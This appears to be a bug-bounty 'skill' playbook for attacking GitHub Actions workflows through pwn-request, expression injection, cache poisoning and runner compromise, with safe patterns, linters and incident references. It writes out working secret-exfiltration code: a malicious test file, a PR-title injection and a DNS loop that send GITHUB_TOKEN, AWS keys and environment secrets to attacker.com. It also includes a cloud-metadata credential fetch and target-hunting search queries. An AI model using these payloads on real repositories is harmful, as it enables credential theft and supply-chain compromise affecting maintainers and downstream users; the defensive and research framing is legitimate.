# GitHub Actions CI/CD Security Skill

**Trigger:** GitHub Actions, CI/CD injection, supply chain, pwn-request, workflow injection, GITHUB_TOKEN
**Payout Ceiling:** Critical ($5K–$25K) | **Target Programs:** any public repo in scope

---

## The "pwn-request" Attack (Core Technique)

### Vulnerable Pattern
```yaml
# VULNERABLE: pull_request_target + explicit checkout of PR code
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ← DANGEROUS: checks out PR code
      - run: npm install && npm test  # ← Now runs attacker's package.json/test scripts
```

**`pull_request_target`** runs with WRITE permissions to the repo. If it checks out PR code,
the attacker controls what runs in a privileged context.

### Safe Pattern (for reference)
```yaml
# SAFE: pull_request (not pull_request_target) = read-only permissions
on: pull_request
# OR: pull_request_target WITHOUT checkout of PR code
```

---

## Attack Surface Discovery

### Step 1 — Find Vulnerable Workflows
```bash
# Search org's public repos for vulnerable patterns
# Method 1: GitHub code search
org:target-org "pull_request_target" "actions/checkout" language:yaml

# Method 2: Clone and grep
git clone https://github.com/target/repo && grep -r "pull_request_target" .github/

# Method 3: GitHub API
curl https://api.github.com/repos/ORG/REPO/contents/.github/workflows/

# Dangerous keywords to grep for:
grep -r "pull_request_target\|workflow_run\|push.*protected\|secrets\." .github/
```

### Step 2 — Identify Secret Access
```yaml
# Does the workflow access secrets?
- uses: actions/checkout@v3
  env:
    API_KEY: ${{ secrets.API_KEY }}     # Secrets accessible in privileged context!
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}  # Write access to repo!
    AWS_SECRET_KEY: ${{ secrets.AWS_SECRET }}
```

### Step 3 — Check GITHUB_TOKEN Permissions
```yaml
# Check the workflow's effective GITHUB_TOKEN permissions
permissions:
  contents: write   # Can push commits!
  packages: write   # Can publish packages!
  pull-requests: write  # Can approve PRs!
```

---

## Exploitation Patterns

### Pattern 1: pwn-request — Modify PR Code to Exfil Secrets
```bash
# Fork the target repo
# Create a PR that modifies a test file or package.json
# Malicious test file that runs when CI executes it:
```
```javascript
// test/evil.test.js — included in PR
const https = require('https');
const secrets = {
  token: process.env.GITHUB_TOKEN,
  aws: process.env.AWS_ACCESS_KEY_ID,
  all: JSON.stringify(process.env)
};
https.get(`https://attacker.com/exfil?data=${Buffer.from(JSON.stringify(secrets)).toString('base64')}`);
```

### Pattern 2: workflow_run Injection
```yaml
# VULNERABLE: workflow_run triggers on completion of another workflow with PR data
on:
  workflow_run:
    workflows: ["PR Tests"]
    types: [completed]
jobs:
  upload:
    steps:
      - name: Download artifact
        uses: actions/download-artifact@v3
      - run: echo "PR=${{ github.event.workflow_run.head_branch }}" >> $GITHUB_ENV
        # ← If head_branch contains shell metacharacters → injection
      - run: ./deploy.sh ${{ github.event.workflow_run.head_branch }}  # INJECTION
```

### Pattern 3: GitHub Expression Injection
```yaml
# VULNERABLE: Unsanitized user-controlled data in run: step
- run: |
    echo "PR title: ${{ github.event.pull_request.title }}"
    # Attack: PR title = "'; curl http://attacker.com/$(cat secrets); #"
```

```yaml
# SAFE alternative:
- name: Check PR title
  env:
    TITLE: ${{ github.event.pull_request.title }}  # Set as env var
  run: echo "PR title: $TITLE"  # Reference env var, not expression
```

### Pattern 4: Cache Poisoning
```yaml
# VULNERABLE: Cache key uses PR data without sanitization
- uses: actions/cache@v3
  with:
    key: ${{ runner.os }}-build-${{ github.event.pull_request.head.sha }}
    # Attack: poison cache to persist malicious build artifacts
```

### Pattern 5: Self-Hosted Runner Compromise
```bash
# If target uses self-hosted runners:
# 1. Gain code execution on runner via pwn-request
# 2. Self-hosted runners persist state between jobs (unlike GitHub-hosted)
# 3. Access IAM roles attached to runner EC2/VM
# 4. Access internal network from runner
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## Finding Targets

```bash
# GitHub code search queries (use GitHub.com UI)
"pull_request_target" "secrets." in:file extension:yml org:kubernetes
"pull_request_target" "actions/checkout" "ref: ${{" in:file extension:yml
"workflow_run" "echo ${{" in:file extension:yml

# Kubernetes-specific (explicit supply chain focus in their BB)
github.com/kubernetes org → search workflows
```

---

## Evidence Collection

```
1. Screenshot of the vulnerable workflow file (with line numbers)
2. Screenshot showing the attack vector (what you'd submit as PR)
3. Proof of concept: show what would be exfilled
   - SAFE PoC: craft PR that would exfil but with attacker.com pointing to Burp Collaborator
   - Show the Collaborator hit (does not need actual secret value)
4. Impact statement: "An attacker could exfil GITHUB_TOKEN to push to protected branches,
   publish malicious packages to npm/PyPI, or access cloud credentials"
```

---

## Report Severity Calibration

| Scenario | Severity |
|----------|----------|
| GITHUB_TOKEN with write access exfiltrated | Critical |
| Cloud credentials (AWS/GCP/Azure) accessible | Critical |
| Read-only GITHUB_TOKEN accessible | High |
| Can push to protected branch | Critical |
| Can publish npm/PyPI package as maintainer | Critical |
| Expression injection with limited output | Medium |

---

---

## Static Analysis Tools (KB Part 1)

```bash
# poutine (BoostSecurity OSS) — static analysis of workflow files for unsafe patterns
# https://github.com/boostsecurityio/poutine
poutine analyze repo github.com/org/target

# zizmor — GitHub Actions security linting
pip install zizmor && zizmor .github/workflows/

# actionlint — workflow syntax + security linting
actionlint .github/workflows/*.yml
```

---

## Supply Chain Real Incidents Reference (KB Part 1)

| Incident | Date | Impact | Method |
|----------|------|--------|--------|
| tj-actions/changed-files (CVE-2025-30066, CVSS 8.6) | March 14-15, 2025 | 23,000+ repos affected | Stolen write token → push malicious commit → update all version tags; Python script dumped runner memory to workflow logs |
| GhostAction | September 2025 | 3,325 secrets from 817 repos | 327 compromised accounts → injected malicious workflow YAML; targets: PyPI, npm, DockerHub, AWS keys |
| Ultralytics YOLO supply chain | December 2024 | Cryptominer in PyPI package | pull_request_target + branch name injection → trojanized package published |

**Detection:** StepSecurity Harden-Runner monitors outbound calls from runner; flagged tj-actions attack by seeing unexpected gist.githubusercontent.com call.

---

## DNS Exfiltration of Secrets (KB Part 1)

```bash
# DNS exfil is rarely filtered by runner egress controls
for secret in $(env | grep -i secret | grep -v GITHUB_ACTION); do
  dig $(echo $secret | base64 | tr -d '=\n' | head -c 60).attacker.com
done
```

---

## workflow_run Artifact Poisoning Pattern (KB Part 1)

```yaml
# VULNERABLE: workflow_run has full repo permissions but downloads PR artifacts
on:
  workflow_run:
    workflows: ["PR Build"]
    types: [completed]
jobs:
  deploy:
    steps:
      - name: Download artifact
        uses: actions/download-artifact@v2
      - run: ./deploy.sh  # Executes potentially malicious artifact from PR
```

Safe pattern: verify artifact source + validate checksums before executing.

---

*Enhanced by KB Part 1 ingestion 2026-03-04*

*Skill: github-actions-security | Created 2026-03-04 | GAP-B from strategic study | Ceiling: Critical ($5K–$25K)*
